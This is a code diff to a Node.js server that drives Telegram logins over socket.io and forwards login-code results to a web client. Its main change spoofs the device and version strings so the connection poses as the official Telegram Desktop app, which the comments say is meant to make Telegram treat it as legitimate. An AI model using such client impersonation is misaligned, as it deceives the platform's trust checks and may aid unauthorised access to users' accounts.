@@ -54,13 +54,15 @@ const createTelegramClient = async (sessionStr, apiId, apiHash) => {
         stringSession.setDC(2, "149.154.167.50", 443);
     }
     
-    // Using a very standard Desktop configuration to ensure stability
+    // CRITICAL CHANGE: Mimic the OFFICIAL Telegram Desktop client exactly.
+    // This forces Telegram to treat this connection as a legitimate desktop app,
+    // prioritizing sending the code to other active mobile apps.
     const client = new TelegramClient(stringSession, Number(apiId), String(apiHash), {
         connectionRetries: 5,
         useWSS: false, 
-        deviceModel: "Desktop", 
+        deviceModel: "Telegram Desktop", // Changed to official name
         systemVersion: "Windows 10",
-        appVersion: "4.16.4 x64", 
+        appVersion: "4.14.13",           // Recent stable version
         langCode: "en",
         systemLangCode: "en",
         timeout: 30, 
@@ -160,7 +162,7 @@ io.on('connection', (socket) => {
 
           // Determine delivery type
           const type = result.type?.className || 'unknown';
-          const isApp = type.includes('App');
+          const isApp = type.includes('App'); // usually auth.SentCodeTypeApp
           
           socket.emit('telegram_send_code_success', { 
               phoneCodeHash: result.phoneCodeHash,
@@ -182,8 +184,6 @@ io.on('connection', (socket) => {
           }
 
           if (err.errorMessage && err.errorMessage.startsWith('PHONE_MIGRATE_')) {
-               // Migration logic omitted for brevity, handled by client reconnect usually or needs full migration block
-               // For now, simpler error to user
                socket.emit('telegram_error', { method: 'sendCode', error: "DC Migration required. Please retry." });
                return;
           }
